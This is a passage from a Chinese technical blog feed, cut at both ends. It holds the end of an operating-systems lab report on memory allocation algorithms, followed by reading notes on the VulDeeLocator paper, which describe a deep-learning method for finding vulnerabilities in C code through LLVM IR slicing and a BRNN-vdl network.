&amp;q);<br>        <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (q)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">allocation</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">recovery</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="程序初值和运行结果-3"><a class="markdownIt-Anchor" href="#程序初值和运行结果-3"></a> 程序初值和运行结果</h4><p>初始状态：</p><p><img src="/posts/6c024da0/image-20211214144921135.png" alt="image-20211214144921135"></p><p>加入工作3，申请量为5：</p><p><img src="/posts/6c024da0/image-20211214145013435.png" alt="image-20211214145013435"></p><p><img src="/posts/6c024da0/image-20211214145032075.png" alt="image-20211214145032075"></p><p>回收工作1：</p><p><img src="/posts/6c024da0/image-20211214145333974.png" alt="image-20211214145333974"></p><p><img src="/posts/6c024da0/image-20211214145129469.png" alt="image-20211214145129469"></p><p>全部回收：</p><p><img src="/posts/6c024da0/image-20211214145241609.png" alt="image-20211214145241609"></p><h4 id="思考题-3"><a class="markdownIt-Anchor" href="#思考题-3"></a> 思考题</h4><p><strong>各种主存分配算法的优缺点</strong></p><ul><li><p>首次适应算法：</p><ul><li><p>优点： 该算法倾向于使用内存中低地址部分的空闲区，在高地址部分的空闲区很少被利用，从而保留了高地址部分的大空闲 区。显然为以后到达的大作业分配大的内存空间创造了条件</p></li><li><p>缺点：低地址部分不断被划分，留下许多难以利用、很小的空闲区，而每次查找又都从低地址部分开始，会增加查找的开销</p></li></ul></li><li><p>最佳适应算法：</p><ul><li><p>优点：每次分配给文件的都是最合适该文件大小的分区。</p></li><li><p>缺点：内存中留下许多难以利用的小的空闲区。</p></li></ul></li><li><p>最差适应算法：</p><ul><li>优点：给文件分配分区后剩下的空闲区不至于太小，产生碎片的几率最小，对中小型文件分配分区操作有利。</li><li>缺点：使存储器中缺乏大的空闲区，对大型文件的分区分配不利。</li></ul></li></ul><p><strong>如何利用空闲分区</strong></p><p>采用可变内存管理，合并小的空闲区。</p><h3 id="五-实验总结-2"><a class="markdownIt-Anchor" href="#五-实验总结-2"></a> 五、实验总结</h3><p>本次实验要我对不同的存储管理方式下应怎样实现主存空间的分配和回收有了更深的理解，对页面置换算法、主存分配回收算法、最先适应算法和位示图方法有了一定的了解，实验算法思路总体上较为简单，只要理解了具体的内存的分配和释放规则就比较容易写出算法。</p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文笔记：《VulDeeLocator:A Deep Learning-based Fine-grained Vulnerability Detector》</title>
    <link href="/posts/33f70302/"/>
    <url>/posts/33f70302/</url>
    
    <content type="html"><![CDATA[<h1 id="一-vuldeellocator基本思想"><a class="markdownIt-Anchor" href="#一-vuldeellocator基本思想"></a> 一、VulDeelLocator基本思想</h1><p>VulDeeLocator的<strong>基本思想</strong>是充分利用<strong>程序分析</strong>和<strong>深度学习</strong>技术:</p><ul><li>通过利用程序分析技术生成漏洞候选，</li><li>并使用深度学习技术“消除”程序分析技术产生的误报。</li></ul><p>具体来说，</p><ul><li>VulDeeLocator根据一组给定的漏洞语法特征，从程序源代码中提取一些标记(例如，标识符、操作符、常量和关键字)，</li><li>然后利用同一程序的中间代码来容纳中间代码中在语义上与这些标记相关的语句。</li><li>这些语句被编码成向量(然后用于训练神经网络)，或者作为训练后的神经网络的输入，用于漏洞检测。</li><li>测试阶段的输出比相应的输入粒度更细(例如，更短或更小)。</li></ul><p>图1说明了这些基本思想，显示了在测试阶段，d’中间代码语句的输入会导致两个源代码语句的精炼输出，表明漏洞在哪里。</p><p><img src="/posts/33f70302/image-20211215140844637.png" alt="image-20211215140844637"></p><h1 id="二-概述"><a class="markdownIt-Anchor" href="#二-概述"></a> 二、概述</h1><p>漏洞很直观地展示了一些语法特征，可以利用这些特征来识别一些代码片段(即程序切片)作为漏洞检测的初始候选项。</p><h2 id="21-基础定义"><a class="markdownIt-Anchor" href="#21-基础定义"></a> 2.1 基础定义</h2><ul><li><p><strong>定义一：</strong><code>sSyVC</code>(source code- and Syntax-based Vulnerability Candidate)：<strong>基于源代码和语法的漏洞候选</strong></p><p>给定一个源程序P和一组漏洞语法特征H= {h1，…， hη}，一个<code>sSyVC</code> y<sub>i</sub>是P中的一个或多个连续符号(例如，标识符、操作符、常量和关键字)，它们匹配某些漏洞语法特征hq(1≤ q≤η).</p></li><li><p><strong>定义二：</strong><code>iSeVC</code> (intermediate code- and Semantics-based Vulnerability Candidate)：<strong>基于中间代码和语义的漏洞候选</strong></p><p>给定一个源程序P，它的中间代码是P’，和P的一个<code>sSyVC</code>  y<sub>i</sub>，用y<sub>i</sub>’表示<code>sSyVC</code> y<sub>i</sub>的中间代码。与sSyVC  yi对应的iSeVC，用ei表示，是中间代码P‘中的语句序列;这些语句是依赖于y<sub>i</sub>’的数据或控制。</p><p>即<code>sSyVC</code>  yi对应的<code>iSeVC</code>是程序P中间代码中的y<sub>i</sub>‘的程序切片。</p></li></ul><h2 id="22-vuldeelocator结构"><a class="markdownIt-Anchor" href="#22-vuldeelocator结构"></a> 2.2 VulDeeLocator结构</h2><p><img src="/posts/33f70302/image-20211215145019213.png" alt="VulDeeLocator结构图"></p><p>上图显示了<strong>VulDeeLocator的结构</strong>，它可以用特定的中间代码表示和深度学习模型来完成实例化。</p><p>VulDeeLocator的<strong>输入</strong>是用于学习神经网络的培训程序的源代码或用于漏洞检测的目标程序。</p><ul><li><p>更具体地说，学习阶段的输入包括C程序的源代码，这些源代码可能有漏洞，也可能没有。</p></li><li><p>C程序的源代码应满足以下条件:</p><ul><li><p>(i)它们可以编译成(平台无关的)中间代码，如LLVM中间代码;</p></li><li><p>(ii)漏洞程序具有对其漏洞位置的描述，这些描述将被用来定位目标程序中的漏洞。</p></li></ul></li></ul><p>VulDeeLocator有<strong>两个组件</strong>。</p><ul><li>第一个组件(<strong>基于中间代码的漏洞候选表示</strong>)利用训练程序和目标程序的中间代码表示，如下所示:<ul><li><strong>步骤I:</strong> 从源代码中提取<code>sSyVCs</code>，即带有一些漏洞语法特征的代码片段。</li><li><strong>步骤II:</strong> 根据<code>sSyVCs</code>从中间代码生成<code>iSeVCs</code>。</li></ul></li><li>第二个组件(<strong>细粒度的漏洞检测</strong>)使用中间代码表示来检测和定位漏洞， 如下所示:<ul><li><strong>步骤III:</strong> 标记从训练项目中提取的<code>iSeVCs</code>是否存在漏洞和存在漏洞的位置。</li><li>**步骤IV: **从<code>iSeVCs</code>及其标签的向量表示训练一个神经网络模型。</li><li><strong>步骤V:</strong> 使用经过训练的神经网络模型检测和定位目标程序中的漏洞。</li></ul></li></ul><p>学习阶段对应步骤I-IV，测试(即检测)阶段对应步骤I、II和V</p><h1 id="三-基于中间代码的漏洞候选表示"><a class="markdownIt-Anchor" href="#三-基于中间代码的漏洞候选表示"></a> 三、基于中间代码的漏洞候选表示</h1><h2 id="31-漏洞候选表示的指导原则"><a class="markdownIt-Anchor" href="#31-漏洞候选表示的指导原则"></a> 3.1 漏洞候选表示的指导原则</h2><ul><li><p><strong>原则1:</strong></p><p>适应<strong>跨文件</strong>的语义相关的程序语句。有些文件可能依赖于其他文件，例如，在一个文件中使用或引用的变量可能在另一个文件中定义。有效的漏洞候选表示应该适应这种定义-使用关系。</p></li><li><p><strong>原则2:</strong></p><p>适应<strong>跨函数</strong>的语义相关的程序语句。语义相关的语句可能会超出函数的边界，这意味着有效的漏洞候选表示应该适应并进一步保持那些语义相关语句的顺序，即使它们属于不同的函数。</p></li></ul><h2 id="32-提取ssyvcs"><a class="markdownIt-Anchor" href="#32-提取ssyvcs"></a> 3.2 提取sSyVCs</h2><p>如上所述，<code>sSyVC</code>是根据某些漏洞语法特征从程序中提取的一段代码。</p><p>获取漏洞语法特征用于漏洞检测的方法可能有很多。作为一个具体的例子，作者利用已知漏洞的语法特征，并通过程序源代码的抽象语法树(AST树)表示这些特征(更准确地说，是AST上节点的属性)。这将简化根据漏洞语法特征提取<code>sSyVCs</code>的过程。</p><p>作者定义了以下四种<strong>漏洞语法特征</strong>。</p><ul><li>库/API函数调用(Library/API Function Call,FC):这个漏洞语法特征是AST上的节点类型是函数调用，函数名匹配库/API函数名，函数调用至少有一个参数是变量。</li><li>数组定义(Array Definition,AD):该漏洞语法特征是AST上的节点类型是变量声明，节点对应的代码包含字符’[‘和’]’。</li><li>指针定义(Array Definition,PD):该漏洞语法特征是AST上的节点类型是变量声明，且该节点对应的代码包含字符“∗”。</li><li>算术表达式(Arithmetic Expression,AE):这个漏洞语法特征是AST上的节点类型是赋值表达式，该节点在赋值表达式的右边至少有一个变量。</li></ul><p>给定一个程序的源代码，可以生成它的AST，通过识别其类型和代码匹配某些漏洞语法特征的节点，可以从中提取sSyVCs。当然这些语法特征本身在检测漏洞方面远远不够，因为它们不能容纳与漏洞相关的适当语义信息。</p><h2 id="33-生成isevcs"><a class="markdownIt-Anchor" href="#33-生成isevcs"></a> 3.3 生成iSeVCs</h2><p>与上述原则相对应的是，生成<code>iSeVCs</code>有三个组件:</p><ul><li><p>生成链接的IR文件(Intermediate Representation);</p></li><li><p>生成<code>sSyVCs</code>对应的IR切片;</p></li><li><p>并生成<code>iSeVCs</code>。</p></li></ul><p>附录中的算法1提供了生成<code>iSeVC</code>的详细信息。</p><h3 id="生成链接的ir文件原则1"><a class="markdownIt-Anchor" href="#生成链接的ir文件原则1"></a> 生成链接的IR文件—(原则1)。</h3><p>该组件从源程序生成一个或多个链接的IR文件，如下所示:</p><ul><li><p>(i) 使用编译器(如Clang)为每个源文件生成一个IR文件;</p></li><li><p>(ii) 根据IR文件的依赖关系链接它们，导致一个或多个IR文件链接。</p></li></ul><p>图4(b)说明了使用示例<code>sSyVC</code> “data”的LLVM中间代码的想法，该示例属于图4(a)中描述的源程序的第2行。作者使用LLVM IR。具体来说，作者使用Clang编译器生成LLVM位码文件，然后根据它们的依赖关系将它们链接起来。</p><h3 id="生成对应于ssyvc的ir切片并生成isevcs原则2"><a class="markdownIt-Anchor" href="#生成对应于ssyvc的ir切片并生成isevcs原则2"></a> 生成对应于sSyVC的IR切片并生成iSeVCs—(原则2)。</h3><p>给定一个<code>sSyVC</code>，我们可以生成相应的IR切片如下:</p><ul><li><p>(i) 通过从链接的IR文件中提取控制和数据依赖来生成一个依赖图;</p></li><li><p>(ii) 根据每个<code>sSyVC</code>对依赖图进行切片，这可以通过dg等工具来完成。</p></li></ul><p>图4©描绘了上述<code>sSyVC</code>“data”对应的LLVM  IR切片。每个局部变量用前缀%的数字值表示;对于LLVM IR片中的每个函数，第一个局部变量的数字值为1，然后对于后续的每个局部变量，值增加1。</p><p>给定IR片，我们生成如下<code>iSeVCs</code>。对于函数fα调用的每个函数fγ，函数fγ的IR切片中的语句被附加到调用函数fγ的语句(在函数fα中)。这是为了保持可能属于<strong>不同函数但彼此相关</strong>(根据控件和/或数据依赖性)的语句的顺序。如果有一个循环序列的函数调用(例如,fγ调用fα然后fα调用fγ,然后fγ调用fα,fα调用fγ,等等),我们只考虑第一个循环(也就是说,γ调用fα然后α调用fγ但不是任何进一步的),以避免无限循环。</p><p>为了避免在不同函数的IR片中将相同的数值赋给不同的局部变量，在附加语句中将局部变量的每个数值修改为一个未赋值的新数值。图4(d)说明了函数printLine的LLVM IR切片中的语句(用虚线框突出显示)被添加到调用函数main的语句“call void @printLine()”中。在printLine函数的LLVM IR切片中，局部变量“%1”被修改为“%20”，因为“19”是main函数中最后赋值的数值，如图4©所示。</p><p><img src="/posts/33f70302/image-20211215155227554.png" alt="image-20211215155227554"></p><h1 id="四-细粒度的漏洞检测"><a class="markdownIt-Anchor" href="#四-细粒度的漏洞检测"></a> 四、细粒度的漏洞检测</h1><h2 id="41-细粒度漏洞检测器的需求"><a class="markdownIt-Anchor" href="#41-细粒度漏洞检测器的需求"></a> 4.1 细粒度漏洞检测器的需求</h2><p>作者对神经网络模型提出以下三个要求，以检测和定位漏洞。</p><ul><li><p><strong>需求1:细化粒度。</strong></p><p>代码的粒度决定了用于分析的源代码的单位，其范围可以从组件的最粗粒度、到文件、到功能、到代码片段、到语句，以及到令牌的最细粒度。细化粒度对于确定漏洞或精确地识别易受攻击的代码行至关重要，这些代码行对应于语句中的粒度。这是因为漏洞检测器的输入是<code>iSeVC</code>，它对应于代码片段中的粗粒度，这意味着漏洞检测器输出的粒度要比输入的粒度细。</p></li><li><p><strong>需求2:易于映射。</strong></p><p>应该很容易将神经网络的输出(以精确的粒度)映射回<code>iSeVC</code>，以查明漏洞。输出应该是一个标记序列，其中一个或多个连续的标记对应中间代码中的同一行代码。这些中间代码行可以很容易地映射回<code>iSeVC</code>，因此也可以映射回源程序中易受攻击的代码行。</p></li><li><p><strong>需求3:注意力。</strong></p><p>注意力的概念借用自深度学习，对应于学习者应该关注的输入的重要部分;从技术上讲，注意力是通过在神经网络中适当地分配权重来实现的(即，更多的注意力意味着更高的权重)。对于一个脆弱的<code>iSeVC</code>，很可能只有一个或几个语句是脆弱的，而其他的则不是，这意味着脆弱的语句比非脆弱的语句更“重要”，因此应该被给予更高的权重。</p></li></ul><h2 id="42-标记isevcs"><a class="markdownIt-Anchor" href="#42-标记isevcs"></a> 4.2 标记iSeVCs</h2><p>对训练项目中的<code>iSeVC</code>进行如下标记:如果<code>iSeVC</code>包含一个已知的漏洞，<code>iSeVC</code>将被标记为<code>iSeVC</code>中漏洞的行号(即漏洞的位置)，用x<sub>1</sub>，…，  x<sub>ζ</sub>表示xi(1 ≤ i ≤ ζ)为漏洞对应的行号;否则，<code>iSeVC</code>被标记为“0”(即不包含漏洞)。</p><h2 id="43-训练神经网络模型"><a class="markdownIt-Anchor" href="#43-训练神经网络模型"></a> 4.3 训练神经网络模型</h2><p>每个iSeVC需要被编码成一个向量，用作神经网络的输入。</p><p>由于得到的向量的长度可能不同，而神经网络以固定长度的θ为输入向量，这些向量可能需要进行如下调整:如果向量短于θ，则在向量的末端填充零;如果一个向量比θ长，则该向量被截断为长度θ，使sSyVC出现在结果向量[17]的中间。</p><h3 id="421-brnns双向循环神经网络实现简单的映射"><a class="markdownIt-Anchor" href="#421-brnns双向循环神经网络实现简单的映射"></a> 4.2.1 BRNNs(双向循环神经网络)实现简单的映射</h3><p>BLSTM (Bidirectional LSTM)、BGRU (Bidirectional GRU)等BRNNs确实能够实现简单的映射，同时又能包容前后语句。</p><p>BRNNs不能实现另外两个需求，因为它们的输出粒度与输入粒度相同(而不是细化输入粒度)，它们平等地对待输入的每个部分。但是对于漏洞检测，iSeVC的某些部分(即脆弱的代码行)可能比iSeVC的其他部分更重要，应该由神经网络予以更多的关注。</p><h3 id="422-brnn-vdl-brnn的一种新变体进一步实现了注意力获取和粒度细化"><a class="markdownIt-Anchor" href="#422-brnn-vdl-brnn的一种新变体进一步实现了注意力获取和粒度细化"></a> 4.2.2 BRNN-vdl: BRNN的一种新变体，进一步实现了注意力获取和粒度细化</h3><p>图5突出了BRNN-vdl的结构，该结构扩展了标准BRNN，增加了三层，制定了“vdl”部分，以实现粒度细化和注意力获取。BRNN-vdl的输入包括</p><ul><li>(i)表示iSeVCs的向量，以及</li><li>(ii)表示每个向量中漏洞位置的漏洞位置矩阵。</li></ul><p>学习阶段输出带有微调参数的BRNN-vdl。</p><p><img src="/posts/33f70302/image-20211221103429273.png" alt="image-20211221103429273"></p><blockquote><p>BRNN-vdl向BRNN扩展了三个额外的层(即， the multiply, κ-max pooling, and average pooling layers)，这些层形成了“vdl”部分，以实现三个期望的属性。</p></blockquote><p>接下来，我们简要回顾一下BRNN，然后描述我们介绍的BRNN-vdl中的三个额外层。</p><h4 id="brnn-vdl中brnn组件的概述"><a class="markdownIt-Anchor" href="#brnn-vdl中brnn组件的概述"></a> BRNN-vdl中BRNN组件的概述</h4><p>如图5所示,标准BRNN具有</p><ul><li><p>(i)<strong>大量的BRNN层</strong>,用来在前后两个方向连接RNN(循环神经网络)细胞(例如,LSTM和GNU)</p></li><li><p>(ii)<strong>致密层</strong>(dense layer),减少从BRNN层接收到的向量的维数</p></li><li><p>(3)<strong>激活层</strong>(activa-tion layer),它使用激活函数在一个时间步中生成输出。</p><p>在本文的背景下，输入是代表带标签的<code>iSeVC</code>的向量。每个时间步骤对应于<code>iSeVC</code>中的一个令牌。在时间步长τ时，其中1≤τ≤λ， λ为每个<code>iSeVC</code>中的标记数，则<code>iSeVC</code> e<sub>i</sub>的BRNN层输出被表示为g<sub>τ</sub>  (e<sub>i</sub>)</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>g</mi><mi>τ</mi></msub><mo stretchy="false">(</mo><msub><mi>e</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><msub><mi>g</mi><mi>τ</mi></msub><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">(</mo><msub><mi>e</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>g</mi><mi>τ</mi></msub><mo>+</mo><mn>1</mn><mo stretchy="false">(</mo><msub><mi>e</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>e</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>ω</mi><mo separator="true">,</mo><mi>β</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g_τ (e_i) =φ(g_τ−1(e_i), g_τ+1(e_i), e_i,ω,β)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.1132em;">τ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.1132em;">τ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">−</span><span class="mord">1</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.1132em;">τ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mclose">)</span></span></span></span></span></p><p>其中ω为权重向量，β为偏差向量，g<sub>τ−1</sub>(ei)和g<sub>τ+1</sub>(ei)分别为BRNN层在时间阶长τ−1和τ+1时的输出，函数φ表示BRNN层的输出由其参数g<sub>τ−1</sub>(e<sub>i</sub>)、g<sub>τ+1</sub>(e<sub>i</sub>)、e<sub>i</sub>、ω和β表示。这些参数如何相互作用取决于RNN细胞，如LSTM和GRU。对于iSeVC  ei，标准BRNN Ai的输出向量(即激活层的输出向量)表示为</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi>g</mi><mn>1</mn></msub><mo stretchy="false">(</mo><msub><mi>e</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>g</mi><mi>λ</mi></msub><mo stretchy="false">(</mo><msub><mi>e</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A_i = (g_1(e_i), . . . , g_λ(e_i))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">λ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></p></li></ul><h4 id="乘法层multiply-layer实现注意力获取"><a class="markdownIt-Anchor" href="#乘法层multiply-layer实现注意力获取"></a> 乘法层(multiply layer)实现注意力获取</h4><p>为了使神经网络能够预测漏洞位置,乘法层需要根据漏洞代码行对应的令牌位置对不同的<code>iSeVCs</code>进行不同的处理。</p><ul><li>(i)对于易受攻击的<code>iSeVCs</code>，乘法层意味着选择与易受攻击的代码行对应的令牌的输出。这些被选中的输出将在后续的层和BRNN-vdl的反向传播过程中使用，因为它们将有助于以更高的精度定位漏洞(相对于不使用这个乘法层来说)。</li><li>(ii)对于不脆弱的<code>iSeVCs</code>，乘法层是指选择token的所有输出，并在后续的层和BRNN-vdl的反向传播过程中使用它们，因为这些token在学习阶段同样重要。</li></ul><p>形式上，对于<code>iSeVC</code> e<sub>i</sub>，乘层将激活层A<sub>i</sub>的输出向量与漏洞位置矩阵L<sub>i</sub>相乘。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>M</mi><mi>i</mi></msub><mo>=</mo><msub><mi>A</mi><mi>i</mi></msub><msub><mi>L</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">M_i = A_iL_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" 